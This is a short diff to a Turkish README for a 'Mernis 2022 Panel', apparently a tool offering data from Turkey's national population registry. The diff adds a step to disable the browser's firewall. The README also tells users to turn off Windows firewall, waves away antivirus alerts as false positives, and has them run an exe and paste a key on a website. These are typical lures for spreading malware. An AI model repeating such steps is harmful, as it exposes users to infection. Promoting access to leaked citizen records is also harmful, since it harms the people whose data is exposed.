@@ -1,6 +1,7 @@
 # mernis
 Mernis 2022 Panel
 
+* İnternet Tarayıcınızın güvenlik duvarını kapatın.
 * Windows güvenlik duvarını kapatın.(Merkezi Nüfus İdaresi Sistemindeki tüm data olduğu için virüs olarak algılanabilir. )
 * Exeyi açın 5-10 saniye içinde web siteye yönlendiriliceksiniz.
 * Web siteye verdiğim key'i yapıştırın ve siteye girin.
